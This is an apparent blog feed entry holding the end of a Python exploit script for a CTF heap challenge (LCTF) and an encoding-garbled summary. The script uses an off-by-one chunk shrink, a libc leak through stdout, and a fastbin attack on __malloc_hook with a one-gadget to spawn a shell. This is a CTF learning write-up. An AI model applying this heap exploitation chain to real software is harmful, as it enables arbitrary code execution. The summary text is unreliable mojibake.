<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">init()</div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #test for off-by-one shrink the chunk to get overlaped chunk</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x10,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x30 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line"></div><div class="line"></div><div class="line">link_header = 0x6030B8</div><div class="line">show_target = 0x603090 #stdout / stdin to leak libc</div><div class="line"></div><div class="line">payload1 = &apos;g&apos; * 0xf8 + p64(show_target) + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload1) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">data =show_package()</div><div class="line">t = data[data.rfind(&quot;length:&quot;):]</div><div class="line">leak_stdout = int(t[7:t.find(&apos;\tcontent:&apos;)],10)</div><div class="line">leak_libc = leak_stdout - offset__IO_2_1_stdout_</div><div class="line">malloc_hook_libc = leak_libc + offset___malloc_hook</div><div class="line">onegadget_libc = leak_libc + off_onegadget</div><div class="line">target = malloc_hook_libc - 0x3 - 0x8#prev 0x7f and -0x3, chunk ptr -0x8</div><div class="line">print &quot;leak_libc: &quot;,hex(leak_libc)</div><div class="line">print &quot;malloc_hook_libc: &quot;,hex(malloc_hook_libc)</div><div class="line">print &quot;onegadget_libc: &quot;, hex(onegadget_libc)</div><div class="line">print &quot;target: &quot;,hex(target)</div><div class="line"></div><div class="line"></div><div class="line">set_package(0x100,&apos;h&apos;*0x8 + &apos;\n&apos;) #get 0x120 chunk and leave</div><div class="line">back_send_loop()</div><div class="line">back_loop()</div><div class="line">init()</div><div class="line"></div><div class="line">set_sender()</div><div class="line">to_recv_loop()</div><div class="line">set_recver() #then use fastbin fd attack, attention we need 0x70 chunk and overwrite it with onegadget</div><div class="line">set_package(0x10,&apos;a&apos; * 0x8 + &apos;\n&apos;) #get 0x30 space</div><div class="line">set_package(0x1f0,&apos;b&apos;*0x8 + &apos;\n&apos;) #get 0x210 space</div><div class="line">set_package(0x100,&apos;c&apos;*0x8 + &apos;\n&apos;) #get 0x120 space</div><div class="line">set_package(0x1f0,&apos;z&apos;*0x8 + &apos;\n&apos;)</div><div class="line"></div><div class="line">del_package(3) #free 0x210</div><div class="line">del_package(0) #free 0x30</div><div class="line"></div><div class="line">set_package(0x10,&apos;a&apos; * 0x10 + &apos;\n&apos;) #get 0x30 and change 0x210 -&gt; 0x200</div><div class="line">set_package(0xf0,&apos;e&apos;*0x8 + &apos;\n&apos;) #get 0x110 from unsorted chunk</div><div class="line">set_package(0x50,&apos;f&apos;*0x8 + &apos;\n&apos;) #get 0x70 from unsorted chunk, our target chunk</div><div class="line"></div><div class="line">del_package(2) #free 0x110</div><div class="line">del_package(2) #free 0x120 and get 0x120 + 0x210 space</div><div class="line">del_package(1) #free 0x70 &apos;f&apos; chunk</div><div class="line">payload2 = &apos;g&apos; * 0xe8 + p64(0x110) + p64(0x70) + p64(target)[:-1] + &apos;\n&apos; #over write 0x110 | 0x30 here</div><div class="line">set_package(0x1f0,payload2) #get 0x210 space and contain the &apos;f&apos; 0x30 chunk</div><div class="line">set_package(0x50,&apos;h&apos; * 0x8 + &apos;\n&apos;) #get 0x70 &apos;f&apos; chunk and turn to &apos;h&apos;</div><div class="line">attach()</div><div class="line">back_send_loop()</div><div class="line">to_recv_loop()</div><div class="line">set_recver()</div><div class="line"></div><div class="line">payload3 = &apos;\x00&apos;*0x4b + &quot;\xf8\x2f\x60&quot; + &apos;\n&apos;</div><div class="line">set_package(0x50,payload3)#get malloc_hook_chunk and set top_chunk to 0x602ff8</div><div class="line">payload4 = p64(onegadget_libc) + p64(onegadget_libc) + &apos;\n&apos;</div><div class="line">set_package(0x1f0,payload4)</div><div class="line">cv(&quot;your choice : &quot;)</div><div class="line">sd(&quot;y&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ç¯‡æµ‹è¯•åšå®¢ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;XDCTFæ˜¯å›½å†…æ¯”è¾ƒç»å…¸çš„ä¸€ä¸ªCTFäº†ï¼Œä»Šå¹´æ”¹æˆLCTFï¼Œä¸­é—´å‘ç”Ÿçš„ä¸€äº›å‰§æƒ…ä¹Ÿæ˜¯ä»¤äººå”å˜˜å•Šâ€¦&lt;/p&gt;
&lt;p&gt;é‚£é¦–å…ˆæ¥çœ‹è¿™ä¸ªé¢˜ç›®å§ï¼Œè¿™é¢˜ç»¼åˆè€ƒå¯Ÿäº†heapå†…å­˜ç®¡ç†ï¼Œshrink the t
    
    </summary>
    
      <category term="CTF-Pwn" scheme="https://windcarp.github.io/categories/CTF-Pwn/"/>
    
    
      <category term="Pwn" scheme="https://windcarp.github.io/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://windcarp.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
